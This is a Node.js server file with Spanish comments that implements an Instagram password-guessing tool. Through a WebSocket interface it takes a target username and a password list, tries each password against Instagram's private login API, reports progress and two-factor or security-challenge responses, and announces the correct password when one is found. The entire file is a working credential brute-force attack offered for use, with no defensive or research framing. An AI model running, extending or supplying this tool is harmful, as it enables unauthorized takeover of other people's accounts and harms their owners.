const WebSocket = require('ws');
const express = require('express');
const { IgApiClient } = require('instagram-private-api');
require('dotenv').config();

// Configuración del servidor HTTP y WebSocket
const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// Servir el frontend
app.use(express.static('public'));

// Función para probar una contraseña
async function testPassword(username, password) {
  const ig = new IgApiClient();
  try {
    // Simular un dispositivo para la API
    ig.state.generateDevice(username);
    console.log(`[DEBUG] Probando contraseña: ${password}`);

    // Intentar iniciar sesión
    await ig.account.login(username, password);
    console.log(`[DEBUG] ¡Contraseña correcta!: ${password}`);
    return { success: true, password };
  } catch (error) {
    console.error(`[DEBUG] Error con la contraseña ${password}:`, error.message);

    // Detectar si se requiere un código de 6 dígitos (2FA)
    if (error.message.includes('two_factor_required')) {
      return { success: false, password, message: 'Se requiere un código de 6 dígitos para la verificación.' };
    }

    // Detectar si la contraseña es correcta pero se requiere un desafío
    if (error.message.includes('challenge_required')) {
      return { success: true, password, message: 'Contraseña correcta, pero se requiere un desafío de seguridad.' };
    }

    // Detectar si la contraseña es incorrecta
    if (error.message.includes('password')) {
      return { success: false, password, message: 'Contraseña incorrecta.' };
    }

    // Otros errores
    return { success: false, password, message: error.message };
  }
}

// Manejo de conexiones WebSocket
wss.on('connection', (ws) => {
  console.log('[DEBUG] Nuevo cliente conectado');

  ws.on('message', async (message) => {
    const data = JSON.parse(message);

    if (data.type === 'startLogin') {
      const { username, passwords } = data;
      let correctPassword = null;

      // Probar cada contraseña línea por línea
      for (let i = 0; i < passwords.length; i++) {
        const password = passwords[i];
        const result = await testPassword(username, password);

        // Enviar el resultado al frontend
        ws.send(JSON.stringify({
          ...result,
          progress: { current: i + 1, total: passwords.length }, // Enviar progreso
        }));

        // Si la contraseña es correcta, guardarla y detener el proceso
        if (result.success) {
          correctPassword = result.password;
          break;
        }
      }

      // Enviar el resultado final al frontend
      if (correctPassword) {
        ws.send(JSON.stringify({
          type: 'finished',
          success: true,
          message: `¡Contraseña correcta encontrada: ${correctPassword}`,
        }));
      } else {
        ws.send(JSON.stringify({
          type: 'finished',
          success: false,
          message: 'Ninguna contraseña fue correcta.',
        }));
      }
    }
  });

  ws.on('close', () => {
    console.log('[DEBUG] Cliente desconectado');
  });
});

// Iniciar el servidor
const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`[DEBUG] Servidor ejecutándose en http://localhost:${PORT}`);
});
